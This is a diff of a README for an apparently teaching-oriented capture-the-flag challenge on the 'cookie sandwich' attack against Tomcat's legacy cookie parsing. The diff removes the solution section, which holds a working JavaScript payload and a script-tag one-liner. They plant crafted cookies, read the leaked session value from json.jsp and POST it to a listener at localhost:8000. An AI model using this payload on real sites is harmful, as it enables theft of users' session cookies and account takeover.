@@ -1,6 +1,4 @@
 ## 🚀 Overview
-Here's my [Blog](https://blog.fooo1.com/cookie-sandwich-attack) :)
-
 Modern browsers and servers usually follow **RFC6265** for cookie parsing—treating quotes as literal characters—while some legacy-compatible servers (e.g. Tomcat) will switch to **RFC2109/2965** parsing when they detect a `$Version` cookie.  
 This challenge lets you:
 1. Spin up a small, vulnerable JSP app in Docker  
@@ -59,38 +57,7 @@ param1="start;JSESSIONID=<secret>;param2=end"
 
 
 ## 💡 How to Solve
-
-1. Trigger an XSS (or paste code in your browser console) on the test page.
-2. Execute the cookie-sandwich payload:
-   ```js
-   document.cookie = '$Version=1; path=/json.jsp;';
-   document.cookie = 'param1="start; path=/json.jsp;';
-   document.cookie = 'param2=end"; path=/;';
-   fetch('/json.jsp', { credentials: 'include' })
-     .then(r => r.json())
-     .then(data => {
-       fetch('http://localhost:8000/', {
-         method: 'POST',
-         body: JSON.stringify(data)
-       });
-     });
-   ```
-3. The bot service will receive your leaked `session` value—check its logs (or UI) for the flag.
-
-For a minimal one-liner (no whitespace):
-```html
-<script>document.cookie='$Version=1; path=/json.jsp;';document.cookie='param1="start; path=/json.jsp;';document.cookie='param2=end"; path=/;';fetch('/json.jsp',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('http://localhost:8000/',{method:'POST',body:JSON.stringify(d)}));</script>
-```
-
-
-## 🔧 Challenge Files
-
-- **`docker-compose.yml`** – Orchestrates two services:  
-  - **`tomcat`** (vulnerable JSP app)  
-  - **`bot`** (Flask+Selenium listener)
-- **`tomcat/json.jsp`** – Returns the first non-JSESSIONID cookie value in JSON.
-- **`flag.jsp`** (optional) – Protected page that requires a valid session.
-- **`bot/`** – Contains the admin bot Dockerfile and listener code to capture your submission.
+Here's my [Blog](https://blog.fooo1.com/cookie-sandwich-attack) :)
 
 
 ## 📝 References
